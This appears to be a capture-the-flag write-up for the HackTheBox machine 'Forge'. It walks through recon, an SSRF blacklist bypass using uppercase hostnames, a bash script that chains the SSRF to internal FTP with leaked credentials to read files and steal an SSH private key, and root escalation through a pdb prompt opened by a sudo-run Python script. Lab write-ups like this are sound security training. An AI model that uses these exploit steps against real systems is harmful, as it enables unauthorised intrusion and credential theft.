# Forge

## Remote Discovery

> Note: the box IP has been added to the `/etc/hosts` file as `forge.htb`

### Nmap Scan

An `nmap -Sc -Sv 10.10.11.111` yields:
```
Nmap scan report for forge.htb (10.10.11.111)
Host is up (0.076s latency).
Not shown: 997 closed ports
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open     http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Gallery
Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.71 seconds
```

Looks like we've got an ftp/http server!

### Busting some dirs
Next, we'll run a basic gobuster scan on the server to sniff out any directories.

```
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://forge.htb
...
/server-status        (Status: 403) [Size: 274]
/static               (Status: 301) [Size: 307] [--> http://forge.htb/static/]
/upload               (Status: 200) [Size: 929]
```

We find a `/upload` page that might come in handy... lets try to exploit that first!

If we look for subdomains instead of subdirectories (and grep for 2** statuses), we'll get some more info:
```
$ gobuster vhost -w /usr/share/SecLists/Discovery/DNS/deepmagic.com-prefixes-top50000.txt -u forge.htb > subd.txt && grep "Status: 2" subd.txt
...
Found: admin.forge.htb (Status: 200) [Size: 27]
```

## admin.forge.htb
We can see that `http://admin.forge.htb` is a valid domain, but it kicks us out saying that "only localhost is allowed"... so we need to trick the admin portal into thinking we are localhost... On the `/upload` page, we have the capacity to upload an image via a url. With that, we can pass `http://admin.forge.htb` through, but we get a message stating the url has been __blacklisted__. Luckily, we can just use upper cases and bypass this restriction: `http://ADMIN.FORGE.HTB`.

This yields us a url that, when using `curl`, will give us the html of the landing admin page! On this page, we find a link to a `<a href="/announcements">` page... going there, using the method used before, gives us the announcements page.


### FTP
The `http://admin.forge.htb/announcements` page contains the ftp creds in plain text! So lets create a tool that will leverage this through our existing exploit to get the contents of files!
> Username: user
>
> Password: heightofsecurity123!

```
$ cat ftp_exploit.sh

#!/bin/bash
PAGE='http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@LOCALHOST'
ENCPAGE=$( php -r "echo urlencode(\"$PAGE$1\");" )
curl $( curl -s -X POST -d "url=$ENCPAGE&remote=1" http://forge.htb/upload | grep "http://forge.htb/uploads/" | cut --delimiter=">" -f3 | cut --delimiter="<" -f1 )
```

This script allows us to make an ftp request. For example `./ftp_exploit.sh` gives us:
```
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Oct 13 04:31 user.txt
```

Great! There is the `user.txt` file we have been looking for. Now we can just `./ftp_exploit.sh "/user.txt"` and we'll get the user flag!

### SSH
Now we are going to try to ssh into the server using dumps of creds we can get using our ftp exploit. We can get the ssh key for the user with `./ftp_exploit.sh "/.ssh/id_rsa" > user_hash`.

Using this, we can ssh into the machine without a password:
```
$ ssh -i user_hash user@forge.htb
user@forge:~$
```

## Privesc
Now our goal is getting root access to this machine. Do do this, we will list out some files we have sudo access to (if any):
```
$ sudo -l
...
User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

So it seems that we can use `/opt/remote-manage.py` as root. Looking at the file, we see there is a password `secretadminpassword` that we use when making a socket connection to localhost. Next, we'll run a command:
```
$ sudo python3 /opt/remote-manage.py
Listening on localhost:20869
```

The port changes every time we run the program. Next we will connect using python to do some fun:
```
$ python3 -c 'exec("import socket as s\nc=s.socket(s.AF_INET,s.SOCK_STREAM)\nc.connect((\"127.0.0.1\",20869))\ndef t(c,m):\n  c.send(m.encode())\n  print(c.recv(1024).decode())\ni=input(\"password: \")\nwhile i!=\"\":\n  t(c,i)\n  i=input(\"$ \")\n\nexit()")'
password: secretadminpassword
Enter the secret passsword: Welcome admin!

What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit

$ 1');echo('test'
```

From here, we can put some nonsense in and we will get an error on the instance where we started the python program:
```
$ sudo python3 /opt/remote-manage.py
Listening on localhost:20869
invalid literal for int() with base 10: b"1');echo('test'"
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb) 
```

We can actually use `(Pdb) ` as a python prompt with root access... so
```
(Pdb) subprocess.getoutput('cat /root/root.txt')
```
Gets us the root flag!
